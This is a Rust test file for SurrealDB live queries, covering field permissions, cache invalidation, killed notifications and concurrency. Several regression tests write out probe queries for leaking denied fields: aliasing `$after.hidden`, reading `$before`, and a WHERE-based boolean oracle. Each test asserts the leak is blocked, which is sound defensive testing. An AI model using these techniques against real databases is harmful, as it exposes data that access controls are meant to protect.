use std::future::Future;
use std::pin::Pin;
use std::sync::Arc;
use std::time::Duration;

use anyhow::Result;
use surrealdb_core::dbs::{MessageBroker, RoutedNotification, Session};
use surrealdb_core::kvs::Datastore;
use surrealdb_core::syn;
use surrealdb_rpc::capabilities::Capabilities;
use surrealdb_types::{Action, Kind, Notification, RecordId, ToSql, Value, vars};

use crate::helpers::{new_ds, new_ns_db, skip_ok};

#[tokio::test]
async fn live_permissions() -> Result<()> {
	let (_, dbs) = new_ds("test", "test", true).await?;

	let ses = Session::owner().with_ns("test").with_db("test").with_rt(true);
	let sql = "
			DEFINE TABLE test SCHEMAFULL PERMISSIONS
				FOR create WHERE { THROW 'create' }
				FOR select WHERE { THROW 'select' }
				FOR update WHERE { THROW 'update' }
				FOR delete WHERE { THROW 'delete' };
			CREATE test:1;
		";
	let res = &mut dbs.execute(sql, &ses, None).await?;
	assert_eq!(res.len(), 2);
	//
	skip_ok(res, 1)?;
	//
	let tmp = res.remove(0).result?;
	let val = syn::value(
		"[
			{
				id: test:1,
			},
		]",
	)
	.unwrap();
	assert_eq!(tmp, val);
	//
	let ses = Session::for_record(
		"test",
		"test",
		"test",
		Value::RecordId(RecordId::new("user".to_owned(), "test".to_owned())),
	)
	.with_rt(true);
	let sql = "
		LIVE SELECT * FROM type::table('test');
		CREATE test:2;
	";
	let res = &mut dbs.execute(sql, &ses, None).await?;
	assert_eq!(res.len(), 2);
	//
	skip_ok(res, 1)?;
	//
	let tmp = res.remove(0).result.unwrap_err().to_string();
	let val = "An error occurred: create".to_string();
	assert_eq!(tmp, val);
	//
	let ses = Session::owner().with_ns("test").with_db("test").with_rt(true);
	let sql = "CREATE test:3;";
	let res = &mut dbs.execute(sql, &ses, None).await?;
	assert_eq!(res.len(), 1);
	//
	let tmp = res.remove(0).result?;
	let val = syn::value(
		"[
			{
				id: test:3,
			},
		]",
	)
	.unwrap();
	assert_eq!(tmp, val);
	//
	Ok(())
}

#[tokio::test]
async fn live_document_reduction() -> Result<()> {
	// Create a new datastore with notifications enabled
	let (channel, dbs) = new_ds("test", "test", true).await?;

	// Create sessions for owner and record user
	let ses_owner = Session::owner().with_ns("test").with_db("test").with_rt(true);
	let ses_record = Session::for_record(
		"test",
		"test",
		"test",
		Value::RecordId(RecordId::new("user".to_owned(), "test".to_owned())),
	)
	.with_rt(true);

	// Setup the scenario
	let sql = "
			DEFINE TABLE test SCHEMAFULL PERMISSIONS FULL;
			DEFINE FIELD visible ON test PERMISSIONS FULL;
			DEFINE FIELD hidden ON test PERMISSIONS NONE;
		";
	let res = &mut dbs.execute(sql, &ses_owner, None).await?;
	assert_eq!(res.len(), 3);
	skip_ok(res, 3)?;

	////////////////////////////////////////////////////////////

	// Create a simple live query
	let sql = "LIVE SELECT * FROM test;";
	let res = &mut dbs.execute(sql, &ses_record, None).await?;
	assert_eq!(res.len(), 1);
	let lqid = res.remove(0).result?;
	assert_eq!(lqid.kind(), Kind::Uuid);

	////////////////////////////////////////////////////////////

	// Create a record
	let sql = "CREATE test:1 SET hidden = 123, visible = 'abc';";
	let res = &mut dbs.execute(sql, &ses_owner, None).await?;
	assert_eq!(res.len(), 1);
	//
	let tmp = res.remove(0).result?;
	let val = syn::value(
		"[
			{
				id: test:1,
				visible: 'abc',
				hidden: 123,
			},
		]",
	)
	.unwrap();
	assert_eq!(tmp, val);

	// Receive the notification
	let tmp = channel.recv().await?;
	assert_eq!(tmp.action, Action::Create);

	// Check the notification
	let val = syn::value(
		"{
			id: test:1,
			visible: 'abc',
		}",
	)
	.unwrap();
	assert_eq!(tmp.result, val);

	////////////////////////////////////////////////////////////

	// Update the record
	let sql = "UPDATE test:1 SET hidden = 456, visible = 'def';";
	let res = &mut dbs.execute(sql, &ses_owner, None).await?;
	assert_eq!(res.len(), 1);
	//
	let tmp = res.remove(0).result?;
	let val = syn::value(
		"[
			{
				id: test:1,
				visible: 'def',
				hidden: 456,
			}
		]",
	)
	.unwrap();
	assert_eq!(tmp, val);

	// Receive the notification
	let tmp = channel.recv().await?;
	assert_eq!(tmp.action, Action::Update);

	// Check the notification
	let val = syn::value(
		"{
			id: test:1,
			visible: 'def',
		}",
	)
	.unwrap();
	assert_eq!(tmp.result, val);

	////////////////////////////////////////////////////////////

	// Delete the record
	let sql = "DELETE test:1;";
	let res = &mut dbs.execute(sql, &ses_owner, None).await?;
	assert_eq!(res.len(), 1);
	skip_ok(res, 1)?;

	// Receive the notification
	let tmp = channel.recv().await?;
	assert_eq!(tmp.action, Action::Delete);

	// Check the notification
	let val = syn::value(
		"{
			id: test:1,
			visible: 'def',
		}",
	)
	.unwrap();
	assert_eq!(tmp.result, val);

	////////////////////////////////////////////////////////////

	// Kill the live query
	let sql = "KILL $uuid";
	let res = &mut dbs.execute(sql, &ses_owner, Some(vars! { uuid: lqid })).await?;
	assert_eq!(res.len(), 1);
	skip_ok(res, 1)?;

	// Receive the notification
	let tmp = channel.recv().await?;
	assert_eq!(tmp.action, Action::Killed);

	// Create a live query with a WHERE clause
	let sql = "LIVE SELECT * FROM test WHERE hidden = 123;";
	let res = &mut dbs.execute(sql, &ses_record, None).await?;
	assert_eq!(res.len(), 1);
	let lqid = res.remove(0).result?;
	assert_eq!(lqid.kind(), Kind::Uuid);

	////////////////////////////////////////////////////////////

	// Create a record
	let sql = "CREATE test:2 SET hidden = 123, visible = 'abc';";
	let res = &mut dbs.execute(sql, &ses_owner, None).await?;
	assert_eq!(res.len(), 1);
	//
	let tmp = res.remove(0).result?;
	let val = syn::value(
		"[
			{
				id: test:2,
				visible: 'abc',
				hidden: 123,
			},
		]",
	)
	.unwrap();
	assert_eq!(tmp, val);

	// Assert no notification is received
	tokio::time::sleep(Duration::from_secs(1)).await;
	let res = channel.try_recv();
	assert!(res.is_err());

	////////////////////////////////////////////////////////////

	// Test passed!
	Ok(())
}

#[tokio::test]
async fn test_live_with_variables() -> Result<()> {
	let (channel, dbs) = new_ds("test", "test", true).await?;

	// Setup
	let ses = Session::owner().with_ns("test").with_db("test").with_rt(true);
	let sql = "
		DEFINE TABLE test;
		DEFINE FIELD num ON test TYPE number;
	";

	let res = &mut dbs.execute(sql, &ses, None).await?;
	assert_eq!(res.len(), 2);
	skip_ok(res, 2)?;

	// Start live query
	let sql = "LIVE SELECT * FROM test WHERE num = $num;";
	let res = &mut dbs.execute(sql, &ses, Some(vars!("num": 123))).await?;
	assert_eq!(res.len(), 1);
	let lqid = res.remove(0).result?;
	assert_eq!(lqid.kind(), Kind::Uuid);

	// Triggers notification
	let sql = "CREATE test:1 SET num = 123;";
	let res = &mut dbs.execute(sql, &ses, None).await?;
	assert_eq!(res.len(), 1);
	skip_ok(res, 1)?;

	// Does not trigger notification
	let sql = "UPDATE test:1 SET num = 456;";
	let res = &mut dbs.execute(sql, &ses, None).await?;
	assert_eq!(res.len(), 1);
	skip_ok(res, 1)?;

	// Kill live query
	let sql = "KILL $uuid";
	let res = &mut dbs.execute(sql, &ses, Some(vars!("uuid": lqid))).await?;
	assert_eq!(res.len(), 1);
	skip_ok(res, 1)?;

	// Receive notification
	let tmp = channel.recv().await?;
	assert_eq!(tmp.action, Action::Create);
	assert_eq!(tmp.result, syn::value("{ id: test:1, num: 123 }")?);
	let tmp = channel.recv().await?;
	assert_eq!(tmp.action, Action::Killed);

	Ok(())
}

// A subscription's compiled work inlines the functions and database
// parameters its clauses read. Redefining one changes no table definition, so
// a unit held for the table's catalog version must still not be reused.
#[tokio::test]
async fn test_live_reads_a_redefined_function_and_param() -> Result<()> {
	let (channel, dbs) = new_ds("test", "test", true).await?;
	let ses = Session::owner().with_ns("test").with_db("test").with_rt(true);

	let sql = "
		DEFINE TABLE lv;
		DEFINE FUNCTION fn::ok() { RETURN false };
		DEFINE PARAM $want VALUE 1;
		LIVE SELECT * FROM lv WHERE fn::ok();
		LIVE SELECT * FROM lv WHERE v = $want;
	";
	let res = &mut dbs.execute(sql, &ses, None).await?;
	assert_eq!(res.len(), 5);
	skip_ok(res, 5)?;

	// Compiles and holds both units: the first matches nothing, the second
	// matches `v = 1`.
	let res = &mut dbs.execute("CREATE lv:1 SET v = 1", &ses, None).await?;
	skip_ok(res, 1)?;
	let tmp = channel.recv().await?;
	assert_eq!(tmp.action, Action::Create);
	assert_eq!(tmp.result, syn::value("{ id: lv:1, v: 1 }")?);
	tokio::time::sleep(Duration::from_millis(100)).await;
	assert!(channel.try_recv().is_err(), "fn::ok() is false, so only one subscription matches");

	let sql = "
		DEFINE FUNCTION OVERWRITE fn::ok() { RETURN true };
		DEFINE PARAM OVERWRITE $want VALUE 2;
	";
	let res = &mut dbs.execute(sql, &ses, None).await?;
	skip_ok(res, 2)?;

	// Both subscriptions now match `v = 2`.
	let res = &mut dbs.execute("CREATE lv:2 SET v = 2", &ses, None).await?;
	skip_ok(res, 1)?;
	for _ in 0..2 {
		let tmp = tokio::time::timeout(Duration::from_secs(5), channel.recv())
			.await
			.expect("both subscriptions read the redefined function and param")?;
		assert_eq!(tmp.action, Action::Create);
		assert_eq!(tmp.result, syn::value("{ id: lv:2, v: 2 }")?);
	}
	tokio::time::sleep(Duration::from_millis(100)).await;
	assert!(channel.try_recv().is_err());

	Ok(())
}

// REMOVE TABLE must invalidate the datastore-wide live-query cache, otherwise
// a write to a same-name recreated table will be processed against the killed
// subscription's cached entry and deliver a notification to a client whose
// LIVE query the server has already declared Killed.
#[tokio::test]
async fn test_remove_table_invalidates_live_cache() -> Result<()> {
	let (channel, dbs) = new_ds("test", "test", true).await?;

	let ses = Session::owner().with_ns("test").with_db("test").with_rt(true);

	// Define the table and start a live query against it.
	let sql = "
		DEFINE TABLE tb;
		LIVE SELECT * FROM tb;
	";
	let res = &mut dbs.execute(sql, &ses, None).await?;
	assert_eq!(res.len(), 2);
	skip_ok(res, 1)?;
	let lqid = res.remove(0).result?;
	assert_eq!(lqid.kind(), Kind::Uuid);

	// First write warms the datastore live-queries cache via `Document::lv()`.
	let sql = "CREATE tb:1;";
	let res = &mut dbs.execute(sql, &ses, None).await?;
	assert_eq!(res.len(), 1);
	skip_ok(res, 1)?;
	let tmp = channel.recv().await?;
	assert_eq!(tmp.action, Action::Create);

	// REMOVE TABLE sends a Killed notification...
	let sql = "REMOVE TABLE tb;";
	let res = &mut dbs.execute(sql, &ses, None).await?;
	assert_eq!(res.len(), 1);
	skip_ok(res, 1)?;
	let tmp = channel.recv().await?;
	assert_eq!(tmp.action, Action::Killed);

	// ...and must also bump the datastore live-query cache version, so a write
	// to a recreated same-name table does not see the stale subscription.
	let sql = "
		DEFINE TABLE tb;
		CREATE tb:2;
	";
	let res = &mut dbs.execute(sql, &ses, None).await?;
	assert_eq!(res.len(), 2);
	skip_ok(res, 2)?;

	// No further notification must be delivered: the live query was killed,
	// and the recreated table has no live queries registered against it.
	tokio::time::sleep(Duration::from_millis(500)).await;
	assert!(channel.try_recv().is_err());

	Ok(())
}

// REMOVE DATABASE destroys every `lq` row in the database as part of the
// deferred prefix delete, so every subscriber in it is owed a Killed. Before
// this was wired up the statement notified nobody and every LIVE client on
// every table in the database waited forever on keys that no longer existed.
#[tokio::test]
async fn test_remove_database_kills_live_queries() -> Result<()> {
	let (channel, dbs) = new_ds("test", "test", true).await?;

	let ses = Session::owner().with_ns("test").with_db("test").with_rt(true);

	// Two tables, one subscription each, so the walk over `all_tb` is exercised
	// rather than just the single-table path.
	let sql = "
		DEFINE TABLE tb1;
		DEFINE TABLE tb2;
		LIVE SELECT * FROM tb1;
		LIVE SELECT * FROM tb2;
	";
	let res = &mut dbs.execute(sql, &ses, None).await?;
	assert_eq!(res.len(), 4);
	skip_ok(res, 2)?;
	let lq1 = res.remove(0).result?;
	let lq2 = res.remove(0).result?;
	assert_eq!(lq1.kind(), Kind::Uuid);
	assert_eq!(lq2.kind(), Kind::Uuid);

	let sql = "REMOVE DATABASE test;";
	let res = &mut dbs.execute(sql, &ses, None).await?;
	assert_eq!(res.len(), 1);
	skip_ok(res, 1)?;

	// Exactly one Killed per subscription, in either order.
	let mut killed = vec![];
	for _ in 0..2 {
		let tmp = tokio::time::timeout(Duration::from_secs(5), channel.recv())
			.await
			.expect("both subscriptions read the redefined function and param")?;
		assert_eq!(tmp.action, Action::Killed);
		killed.push(Value::Uuid(tmp.id));
	}
	killed.sort();
	let mut expected = vec![lq1, lq2];
	expected.sort();
	assert_eq!(killed, expected);

	// And nothing further.
	tokio::time::sleep(Duration::from_millis(500)).await;
	assert!(channel.try_recv().is_err());

	Ok(())
}

// The same for REMOVE NAMESPACE, which additionally walks `all_db`.
#[tokio::test]
async fn test_remove_namespace_kills_live_queries() -> Result<()> {
	let (channel, dbs) = new_ds("test", "test", true).await?;

	let ses = Session::owner().with_ns("test").with_db("test").with_rt(true);
	let sql = "
		DEFINE TABLE tb;
		LIVE SELECT * FROM tb;
	";
	let res = &mut dbs.execute(sql, &ses, None).await?;
	assert_eq!(res.len(), 2);
	skip_ok(res, 1)?;
	let lqid = res.remove(0).result?;
	assert_eq!(lqid.kind(), Kind::Uuid);

	let sql = "REMOVE NAMESPACE test;";
	let res = &mut dbs.execute(sql, &ses, None).await?;
	assert_eq!(res.len(), 1);
	skip_ok(res, 1)?;

	let tmp = channel.recv().await?;
	assert_eq!(tmp.action, Action::Killed);
	assert_eq!(Value::Uuid(tmp.id), lqid);

	tokio::time::sleep(Duration::from_millis(500)).await;
	assert!(channel.try_recv().is_err());

	Ok(())
}

// The Killed notifications are owed only if the removal becomes durable.
// Sending them eagerly would tear down every subscription in the database for
// a statement a later rollback undoes, leaving the restored `lq` rows with no
// listener.
#[tokio::test]
async fn test_cancelled_remove_database_sends_no_kill() -> Result<()> {
	let (channel, dbs) = new_ds("test", "test", true).await?;

	let ses = Session::owner().with_ns("test").with_db("test").with_rt(true);
	let sql = "
		DEFINE TABLE tb;
		LIVE SELECT * FROM tb;
	";
	let res = &mut dbs.execute(sql, &ses, None).await?;
	assert_eq!(res.len(), 2);
	skip_ok(res, 2)?;

	let sql = "
		BEGIN;
		REMOVE DATABASE test;
		CANCEL;
	";
	let _ = dbs.execute(sql, &ses, None).await?;

	tokio::time::sleep(Duration::from_millis(500)).await;
	assert!(
		channel.try_recv().is_err(),
		"a cancelled REMOVE DATABASE must not tell subscribers they are dead"
	);

	Ok(())
}

// Redefining a table as a view wipes its whole key range, `lq` rows included,
// so it owes its subscribers a Killed for the same reason `REMOVE TABLE` does.
// The obligation follows the key range rather than the statement, which is why
// it was missed when the fan-out was first written at the REMOVE statements.
#[tokio::test]
async fn test_overwrite_table_as_view_kills_live_queries() -> Result<()> {
	let (channel, dbs) = new_ds("test", "test", true).await?;

	let ses = Session::owner().with_ns("test").with_db("test").with_rt(true);
	let sql = "
		DEFINE TABLE src;
		DEFINE TABLE tb;
		LIVE SELECT * FROM tb;
	";
	let res = &mut dbs.execute(sql, &ses, None).await?;
	assert_eq!(res.len(), 3);
	skip_ok(res, 2)?;
	let lqid = res.remove(0).result?;
	assert_eq!(lqid.kind(), Kind::Uuid);

	let sql = "DEFINE TABLE OVERWRITE tb AS SELECT count() FROM src GROUP ALL;";
	let res = &mut dbs.execute(sql, &ses, None).await?;
	assert_eq!(res.len(), 1);
	skip_ok(res, 1)?;

	let tmp = channel.recv().await?;
	assert_eq!(tmp.action, Action::Killed);
	assert_eq!(Value::Uuid(tmp.id), lqid);

	tokio::time::sleep(Duration::from_millis(500)).await;
	assert!(channel.try_recv().is_err());

	Ok(())
}

// A subscription captures the `Auth` of whoever ran the LIVE and replays it on
// every notification, so revoking that principal does not stop delivery on its
// own: without teardown, `REMOVE USER u` leaves u's subscriptions streaming
// rows to a still-open socket, evaluated under u's permissions.
#[tokio::test]
async fn test_remove_user_kills_their_live_queries() -> Result<()> {
	let (channel, dbs) = new_ds("test", "test", true).await?;

	let owner = Session::owner().with_ns("test").with_db("test").with_rt(true);
	let sql = "
		DEFINE TABLE tb PERMISSIONS FULL;
		DEFINE USER alice ON DATABASE PASSWORD 'x' ROLES OWNER;
	";
	let res = &mut dbs.execute(sql, &owner, None).await?;
	assert_eq!(res.len(), 2);
	skip_ok(res, 2)?;

	// alice subscribes.
	let alice = Session::for_level(
		surrealdb_iam::Level::Database("test".into(), "test".into()),
		surrealdb_iam::Role::Owner,
	)
	.with_ns("test")
	.with_db("test")
	.with_rt(true);
	let alice = Session {
		au: std::sync::Arc::new(surrealdb_iam::Auth::new(surrealdb_iam::Actor::new(
			"alice".to_string(),
			vec![surrealdb_iam::Role::Owner],
			surrealdb_iam::Level::Database("test".into(), "test".into()),
		))),
		..alice
	};
	let res = &mut dbs.execute("LIVE SELECT * FROM tb", &alice, None).await?;
	assert_eq!(res.len(), 1);
	let lqid = res.remove(0).result?;
	assert_eq!(lqid.kind(), Kind::Uuid);

	// Revoking alice must tear her subscription down.
	let res = &mut dbs.execute("REMOVE USER alice ON DATABASE", &owner, None).await?;
	assert_eq!(res.len(), 1);
	skip_ok(res, 1)?;

	let tmp = channel.recv().await?;
	assert_eq!(tmp.action, Action::Killed);
	assert_eq!(Value::Uuid(tmp.id), lqid);

	// And no further notification reaches her.
	let res = &mut dbs.execute("CREATE tb:1", &owner, None).await?;
	assert_eq!(res.len(), 1);
	skip_ok(res, 1)?;
	tokio::time::sleep(Duration::from_millis(500)).await;
	assert!(channel.try_recv().is_err(), "a revoked principal must stop receiving rows");

	Ok(())
}

/// A LIVE projection rooted at `$after` / `$before` must not read a field the
/// subscriber has no permission to select.
///
/// The projection is subscriber-authored and `$after` / `$before` are trusted
/// LIVE params, so binding the unreduced record to them lets the subscriber
/// copy a denied field straight into the notification payload — the reduced
/// document the normal delivery path uses notwithstanding. Sibling of
/// `live_document_reduction`, which covers the payload path.
#[tokio::test]
async fn live_projection_via_params_respects_field_permissions() -> Result<()> {
	let (channel, dbs) = new_ds("test", "test", true).await?;

	let ses_owner = Session::owner().with_ns("test").with_db("test").with_rt(true);
	let ses_record = Session::for_record(
		"test",
		"test",
		"test",
		Value::RecordId(RecordId::new("user".to_owned(), "test".to_owned())),
	)
	.with_rt(true);

	let sql = "
		DEFINE TABLE test SCHEMAFULL PERMISSIONS FULL;
		DEFINE FIELD visible ON test PERMISSIONS FULL;
		DEFINE FIELD hidden ON test PERMISSIONS NONE;
	";
	let res = &mut dbs.execute(sql, &ses_owner, None).await?;
	assert_eq!(res.len(), 3);
	skip_ok(res, 3)?;

	// Project the restricted field out of `$after` under an alias, so the
	// name-keyed output filter has no matching path to cut.
	let sql = "LIVE SELECT $after.hidden AS leaked, $after.visible AS shown FROM test;";
	let res = &mut dbs.execute(sql, &ses_record, None).await?;
	assert_eq!(res.len(), 1);
	let lqid = res.remove(0).result?;
	assert_eq!(lqid.kind(), Kind::Uuid);

	// CREATE: `$after` carries the new record.
	let sql = "CREATE test:1 SET hidden = 123, visible = 'abc';";
	let res = &mut dbs.execute(sql, &ses_owner, None).await?;
	assert_eq!(res.len(), 1);
	skip_ok(res, 1)?;

	let tmp = channel.recv().await?;
	assert_eq!(tmp.action, Action::Create);
	// `leaked` must be NONE, and the unrestricted sibling must still arrive so
	// the params are bound to the record rather than to nothing at all.
	assert_eq!(
		tmp.result,
		syn::value("{ leaked: NONE, shown: 'abc' }")?,
		"a LIVE projection must not read a denied field through $after"
	);

	// UPDATE: `$after` carries the post-mutation record.
	let sql = "UPDATE test:1 SET hidden = 456, visible = 'def';";
	let res = &mut dbs.execute(sql, &ses_owner, None).await?;
	assert_eq!(res.len(), 1);
	skip_ok(res, 1)?;

	let tmp = channel.recv().await?;
	assert_eq!(tmp.action, Action::Update);
	assert_eq!(tmp.result, syn::value("{ leaked: NONE, shown: 'def' }")?);

	Ok(())
}

/// The delete-side sibling: `$before` must be reduced too. The delete path
/// clears `self.current` before LIVE processing, so `$before` is the only
/// param carrying the pre-delete record.
#[tokio::test]
async fn live_projection_via_before_param_respects_field_permissions() -> Result<()> {
	let (channel, dbs) = new_ds("test", "test", true).await?;

	let ses_owner = Session::owner().with_ns("test").with_db("test").with_rt(true);
	let ses_record = Session::for_record(
		"test",
		"test",
		"test",
		Value::RecordId(RecordId::new("user".to_owned(), "test".to_owned())),
	)
	.with_rt(true);

	let sql = "
		DEFINE TABLE test SCHEMAFULL PERMISSIONS FULL;
		DEFINE FIELD visible ON test PERMISSIONS FULL;
		DEFINE FIELD hidden ON test PERMISSIONS NONE;
		CREATE test:1 SET hidden = 123, visible = 'abc';
	";
	let res = &mut dbs.execute(sql, &ses_owner, None).await?;
	assert_eq!(res.len(), 4);
	skip_ok(res, 4)?;

	let sql = "LIVE SELECT $before.hidden AS leaked, $before.visible AS shown FROM test;";
	let res = &mut dbs.execute(sql, &ses_record, None).await?;
	assert_eq!(res.len(), 1);
	let lqid = res.remove(0).result?;
	assert_eq!(lqid.kind(), Kind::Uuid);

	let sql = "DELETE test:1;";
	let res = &mut dbs.execute(sql, &ses_owner, None).await?;
	assert_eq!(res.len(), 1);
	skip_ok(res, 1)?;

	let tmp = channel.recv().await?;
	assert_eq!(tmp.action, Action::Delete);
	assert_eq!(
		tmp.result,
		syn::value("{ leaked: NONE, shown: 'abc' }")?,
		"a LIVE projection must not read a denied field through $before"
	);

	Ok(())
}

/// A LIVE `WHERE` clause rooted at `$after` must not be able to test a field
/// the subscriber has no permission to select.
///
/// The payload may still omit the field, but whether a notification arrives at
/// all is itself the disclosure: the pair of outcomes below turns delivery into
/// a boolean oracle over the restricted value. Sibling of the
/// `WHERE hidden = 123` coverage in `live_document_reduction`.
#[tokio::test]
async fn live_where_via_params_respects_field_permissions() -> Result<()> {
	let (channel, dbs) = new_ds("test", "test", true).await?;

	let ses_owner = Session::owner().with_ns("test").with_db("test").with_rt(true);
	let ses_record = Session::for_record(
		"test",
		"test",
		"test",
		Value::RecordId(RecordId::new("user".to_owned(), "test".to_owned())),
	)
	.with_rt(true);

	let sql = "
		DEFINE TABLE test SCHEMAFULL PERMISSIONS FULL;
		DEFINE FIELD visible ON test PERMISSIONS FULL;
		DEFINE FIELD hidden ON test PERMISSIONS NONE;
	";
	let res = &mut dbs.execute(sql, &ses_owner, None).await?;
	assert_eq!(res.len(), 3);
	skip_ok(res, 3)?;

	let sql = "LIVE SELECT * FROM test WHERE $after.hidden = 123;";
	let res = &mut dbs.execute(sql, &ses_record, None).await?;
	assert_eq!(res.len(), 1);
	let lqid = res.remove(0).result?;
	assert_eq!(lqid.kind(), Kind::Uuid);

	// A record whose restricted field matches the guessed value must not
	// deliver: `$after.hidden` reads NONE, so the predicate is false.
	let sql = "CREATE test:1 SET hidden = 123, visible = 'abc';";
	let res = &mut dbs.execute(sql, &ses_owner, None).await?;
	assert_eq!(res.len(), 1);
	skip_ok(res, 1)?;

	let res = tokio::time::timeout(Duration::from_millis(500), channel.recv()).await;
	assert!(res.is_err(), "a LIVE WHERE clause must not match on a denied field through $after");

	// Control: the same subscription shape over an *unrestricted* field still
	// matches, so the guard is scoped to denied fields rather than making every
	// param-rooted predicate unsatisfiable.
	let sql = "LIVE SELECT * FROM test WHERE $after.visible = 'xyz';";
	let res = &mut dbs.execute(sql, &ses_record, None).await?;
	assert_eq!(res.len(), 1);
	let lqid = res.remove(0).result?;
	assert_eq!(lqid.kind(), Kind::Uuid);

	let sql = "CREATE test:2 SET hidden = 789, visible = 'xyz';";
	let res = &mut dbs.execute(sql, &ses_owner, None).await?;
	assert_eq!(res.len(), 1);
	skip_ok(res, 1)?;

	let tmp = tokio::time::timeout(Duration::from_millis(500), channel.recv())
		.await
		.expect("an unrestricted param-rooted predicate must still match")?;
	assert_eq!(tmp.action, Action::Create);
	assert_eq!(tmp.result, syn::value("{ id: test:2, visible: 'xyz' }")?);

	Ok(())
}

/// A subscriber's table `PERMISSIONS FOR select` that reads a `COMPUTED` field
/// is judged with that field derived from the notified record, in the
/// permission's own frame: reads unchecked, so a body following a record the
/// subscriber may not select still reads it. A computed field is not stored,
/// so judged against the record as written the clause reads `NONE`, and a
/// deny-intended clause delivers every record.
#[tokio::test]
async fn live_select_permission_reads_computed_fields() -> Result<()> {
	let (channel, dbs) = new_ds("test", "test", true).await?;
	let ses_owner = Session::owner().with_ns("test").with_db("test").with_rt(true);
	let ses_record = Session::for_record(
		"test",
		"test",
		"test",
		Value::RecordId(RecordId::new("user".to_owned(), "test".to_owned())),
	)
	.with_rt(true);

	let sql = "
		DEFINE TABLE meta SCHEMALESS PERMISSIONS NONE;
		CREATE meta:secret SET secret = true;
		CREATE meta:open SET secret = false;
		DEFINE TABLE doc SCHEMALESS
			PERMISSIONS FOR select WHERE hidden != true AND locked != true, FOR create, update FULL;
		DEFINE FIELD hidden ON doc COMPUTED status = 'secret';
		DEFINE FIELD locked ON doc COMPUTED meta.secret;
	";
	let res = &mut dbs.execute(sql, &ses_owner, None).await?;
	assert_eq!(res.len(), 6);
	skip_ok(res, 6)?;

	let res = &mut dbs.execute("LIVE SELECT VALUE id FROM doc;", &ses_record, None).await?;
	let lqid = res.remove(0).result?;
	assert_eq!(lqid.kind(), Kind::Uuid);

	// Only `doc:pub` may reach the subscriber: `doc:sec` is hidden, and
	// `doc:locked` is locked through a record the subscriber may not select.
	// The writer may not select it either, so `locked` derived as the writer
	// is `NONE`.
	let sql = "
		CREATE doc:sec SET status = 'secret', meta = meta:open;
		CREATE doc:locked SET status = 'public', meta = meta:secret;
		CREATE doc:pub SET status = 'public', meta = meta:open;
	";
	let res = &mut dbs.execute(sql, &ses_record, None).await?;
	skip_ok(res, 3)?;

	let tmp = channel.recv().await?;
	assert_eq!(tmp.action, Action::Create);
	assert_eq!(tmp.result, syn::value("doc:pub").unwrap(), "only the visible record is delivered");

	tokio::time::sleep(Duration::from_millis(500)).await;
	assert!(channel.try_recv().is_err(), "no hidden record is delivered");
	Ok(())
}

/// A field's `PERMISSIONS FOR select` that reads a `COMPUTED` field is judged
/// for a subscriber with that field derived in the clause's own frame: reads
/// unchecked, so a body following a record the subscriber may not select still
/// reads it. Derived as the subscriber, the body reads `NONE`, and a
/// deny-intended clause delivers the field. The subscriber receives the
/// computed field as the subscriber reads it.
#[tokio::test]
async fn live_field_select_permission_reads_computed_fields() -> Result<()> {
	let (channel, dbs) = new_ds("test", "test", true).await?;
	let ses_owner = Session::owner().with_ns("test").with_db("test").with_rt(true);
	let ses_record = Session::for_record(
		"test",
		"test",
		"test",
		Value::RecordId(RecordId::new("user".to_owned(), "test".to_owned())),
	)
	.with_rt(true);

	let sql = "
		DEFINE TABLE meta SCHEMALESS PERMISSIONS NONE;
		CREATE meta:secret SET secret = true;
		CREATE meta:open SET secret = false;
		DEFINE TABLE doc SCHEMALESS PERMISSIONS FULL;
		DEFINE FIELD hidden ON doc COMPUTED meta.secret;
		DEFINE FIELD body ON doc PERMISSIONS FOR select WHERE hidden != true;
	";
	let res = &mut dbs.execute(sql, &ses_owner, None).await?;
	assert_eq!(res.len(), 6);
	skip_ok(res, 6)?;

	let res = &mut dbs.execute("LIVE SELECT id, body, hidden FROM doc;", &ses_record, None).await?;
	let lqid = res.remove(0).result?;
	assert_eq!(lqid.kind(), Kind::Uuid);

	let sql = "
		CREATE doc:sec SET meta = meta:secret, body = 'classified';
		CREATE doc:pub SET meta = meta:open, body = 'public';
	";
	let res = &mut dbs.execute(sql, &ses_record, None).await?;
	skip_ok(res, 2)?;

	let tmp = channel.recv().await?;
	assert_eq!(tmp.action, Action::Create);
	assert_eq!(
		tmp.result,
		syn::value("{ body: NONE, hidden: NONE, id: doc:sec }").unwrap(),
		"the body of a record whose `meta` is secret is withheld"
	);
	let tmp = channel.recv().await?;
	assert_eq!(tmp.action, Action::Create);
	assert_eq!(tmp.result, syn::value("{ body: 'public', hidden: NONE, id: doc:pub }").unwrap());
	Ok(())
}

// `LIVE` statements sent together over one task, as one connection's requests
// are, all register. Thirty per round, resumed in the order they are woken,
// share one task's cooperative budget, which runs out within a round, so a
// registration can yield inside its write transaction and lose its commit to
// a later one; the server runs the loser again, and none reports a conflict.
#[cfg(feature = "kv-surrealkv")]
#[tokio::test(flavor = "multi_thread")]
async fn concurrent_lives_on_one_task_do_not_conflict() -> Result<()> {
	use futures::StreamExt;

	const ROUNDS: usize = 20;
	const PER_ROUND: usize = 30;

	let dir = temp_dir::TempDir::new()?;
	let ds = surrealkv_ds_with(&dir, false).await?;
	let ses = Session::owner().with_ns("test").with_db("test").with_rt(true);

	for round in 0..ROUNDS {
		let res = &mut ds.execute(&format!("DEFINE TABLE person_{round}"), &ses, None).await?;
		skip_ok(res, 1)?;
		let sql = format!("LIVE SELECT * FROM person_{round}");
		// Polled as a connection polls its requests: each is resumed in the
		// order it is woken, not the order it was sent.
		let results: Vec<_> = (0..PER_ROUND)
			.map(|_| ds.execute(&sql, &ses, None))
			.collect::<futures::stream::FuturesUnordered<_>>()
			.collect()
			.await;
		for result in results {
			for response in result? {
				if let Err(e) = response.result {
					return Err(anyhow::anyhow!("round {round}: a LIVE failed: {e}"));
				}
			}
		}
		assert_eq!(lives(&ds, &ses, &format!("person_{round}")).await?.len(), PER_ROUND);
	}
	Ok(())
}

/// The ids `INFO FOR TABLE` lists as live queries on `table`.
#[cfg(feature = "kv-surrealkv")]
async fn lives(
	ds: &surrealdb_core::kvs::Datastore,
	ses: &Session,
	table: &str,
) -> Result<Vec<String>> {
	let res = &mut ds.execute(&format!("INFO FOR TABLE {table}"), ses, None).await?;
	let Value::Object(info) = res.remove(0).result? else {
		return Err(anyhow::anyhow!("INFO FOR TABLE should answer an object"));
	};
	let Some(Value::Object(lives)) = info.get("lives") else {
		return Err(anyhow::anyhow!("INFO FOR TABLE should list `lives`"));
	};
	Ok(lives.keys().cloned().collect())
}

/// Open a SurrealKV datastore in `dir` with a `test`/`test` database, with
/// commits fsynced (the default) or not.
///
